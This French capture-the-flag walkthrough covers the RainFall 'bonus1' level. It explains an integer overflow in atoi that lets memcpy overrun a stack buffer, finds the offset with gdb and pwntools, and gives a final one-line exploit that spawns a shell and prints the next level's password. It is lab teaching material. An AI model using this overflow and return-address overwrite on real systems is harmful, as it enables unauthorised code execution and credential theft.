# Bonus1

## 0 - Test de l'éxécutable

```shell
bonus1@RainFall:~$ ./bonus1 
Segmentation fault (core dumped)
bonus1@RainFall:~$ ./bonus1 rgfer
bonus1@RainFall:~$ ./bonus1 
Segmentation fault (core dumped)
bonus1@RainFall:~$ ./bonus1 rgserg
bonus1@RainFall:~$ ./bonus1 rgserg ergseers
bonus1@RainFall:~$ ./bonus1 rgserg ergseers serhsrthsert
bonus1@RainFall:~$ 
bonus1@RainFall:~$ ./bonus1 9
Segmentation fault (core dumped)
bonus1@RainFall:~$ ./bonus1 10
bonus1@RainFall:~$ 
```

On remarque que le programme segfault lorsque le premier argument est inférieur ou égal à 9

## 1 - Analyse du code source

```C
int main(int argc, const char **argv) {
    char dest[40];  // Buffer de 40 bytes sur la stack
    int v5;         // Variable stockée juste après dest sur la stack
    
    // Convertit le premier argument en entier
    v5 = atoi(argv[1]);
    
    // Vérifie que v5 <= 9
    if (v5 > 9)
        return 1;
    
    // Copie 4 * v5 bytes depuis argv[2] dans dest
    // VULNÉRABILITÉ: Si on peut écraser v5 (qui est après dest sur la stack),
    // on peut contourner la vérification v5 > 9 et atteindre la condition suivante
    memcpy(dest, argv[2], 4 * v5);
    
    // Condition impossible à atteindre normalement (v5 <= 9, mais 1464814662 > 9)
    // Mais si v5 a été écrasé par le memcpy précédent, cette condition peut être vraie
    if (v5 == 1464814662)
        execl("/bin/sh", "sh", 0);
    
    return 0;
}
```

Cette fois-ci, il faut exploiter la propriété de dépassement d’atoi() pour obtenir plus de bytes à copier avec memcpy(). Comme vu dans l’analyse plus bas, le buffer a un offset de 56 octets, mais il faut passer la vérification qui exige que notre entrée soit inférieure à 10. Pour cela, on doit trouver un nombre négatif qui, après un "underflow", donne un grand nombre positif.


## 2 - Récupération de la valeur souhaitée de v5

On veut une grande valeur négative qui nous permette à la fois:
- de ne pas déclencher la condition `if (v5 > 9)`
- de pouvoir overflow le `memcpy(dest, argv[2], 4 * v5)`

On crée le petit programme suivant :

```C
#include <stdio.h>
int main(void) {
	int input = 0;
  int result = 0;
	for (int _ = 0; result <= 0 || result > 64; input--) {
		result = input * 4;
        // if (result == 64) {
        //     printf("result = %d\n", result);
        //     printf("input = %d\n", input);
        // } 
	}
    printf("-----\n");
    printf("input = %d\n", input);
    printf("input * 4 = %d\n", input * 4);
    printf("result = %d\n", result); 
    // result n'est pas égale à input * 4 car input garde 
    // la derniere valeur pour laquelle les conditions étaient remplies
}
```

Output :
```
(cons310_i2) ➜  bonus1 git:(main) ✗ ./a.out  
-----
input = -1073741809
input * 4 = 60
```

Avec la valeur `-1073741809` on remplit donc bien les deux conditions

## 3 - Récupération de l'offset


```shell
bonus1@RainFall:~$ gdb ./bonus1
[...]
(gdb) run -1073741809 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
[...]
Program received signal SIGSEGV, Segmentation fault.
0x6161616f in ?? ()
```

```shell
(cons310_i2) ➜  bonus1 git:(main) ✗ python -c "from pwn import *; print(cyclic_find(0x6161616f))"
56
```

On a donc un offset de 56

## 3 - Récupération de l'adresse d'execution de execl

Dans gdb:

```shell
bonus1@RainFall:~$ gdb ./bonus1
[...]
(gdb) disass main
Dump of assembler code for function main:
   0x08048424 <+0>:	push   %ebp
   0x08048425 <+1>:	mov    %esp,%ebp
   0x08048427 <+3>:	and    $0xfffffff0,%esp
   0x0804842a <+6>:	sub    $0x40,%esp
   0x0804842d <+9>:	mov    0xc(%ebp),%eax
   0x08048430 <+12>:	add    $0x4,%eax
   0x08048433 <+15>:	mov    (%eax),%eax
   0x08048435 <+17>:	mov    %eax,(%esp)
   0x08048438 <+20>:	call   0x8048360 <atoi@plt>
   0x0804843d <+25>:	mov    %eax,0x3c(%esp)
   0x08048441 <+29>:	cmpl   $0x9,0x3c(%esp)
   0x08048446 <+34>:	jle    0x804844f <main+43>
   0x08048448 <+36>:	mov    $0x1,%eax
   0x0804844d <+41>:	jmp    0x80484a3 <main+127>
   0x0804844f <+43>:	mov    0x3c(%esp),%eax
   0x08048453 <+47>:	lea    0x0(,%eax,4),%ecx
   0x0804845a <+54>:	mov    0xc(%ebp),%eax
   0x0804845d <+57>:	add    $0x8,%eax
   0x08048460 <+60>:	mov    (%eax),%eax
   0x08048462 <+62>:	mov    %eax,%edx
   0x08048464 <+64>:	lea    0x14(%esp),%eax
   0x08048468 <+68>:	mov    %ecx,0x8(%esp)
   0x0804846c <+72>:	mov    %edx,0x4(%esp)
   0x08048470 <+76>:	mov    %eax,(%esp)
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)
   0x08048480 <+92>:	jne    0x804849e <main+122>
   0x08048482 <+94>:	movl   $0x0,0x8(%esp)
   0x0804848a <+102>:	movl   $0x8048580,0x4(%esp)
   0x08048492 <+110>:	movl   $0x8048583,(%esp)
   0x08048499 <+117>:	call   0x8048350 <execl@plt>
   0x0804849e <+122>:	mov    $0x0,%eax
   0x080484a3 <+127>:	leave  
   0x080484a4 <+128>:	ret    
End of assembler dump.
(gdb) 
```

On sait que l'appel à execl() se trouve à la fin du main et après un appel de condition, à la fin du dissass main on voit :

```
   0x08048480 <+92>:	jne    0x804849e <main+122>    <<< appel de condition
   0x08048482 <+94>:	movl   $0x0,0x8(%esp)          <<< premier argument de execl()
   0x0804848a <+102>:	movl   $0x8048580,0x4(%esp)    <<< deuxieme argument de execl()
   0x08048492 <+110>:	movl   $0x8048583,(%esp)       <<< troisieme argument de execl()
   0x08048499 <+117>:	call   0x8048350 <execl@plt>   <<< appel de la fonction
   0x0804849e <+122>:	mov    $0x0,%eax
```

L'adresse du démarrage de execl est donc : `0x08048482`

## 4 - Exploit final

```
bonus1@RainFall:~$ ./bonus1 -1073741809 $(python -c "print '\x90' * 56 + '\x08\x04\x84\x82'[::-1]")
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
$ 
```
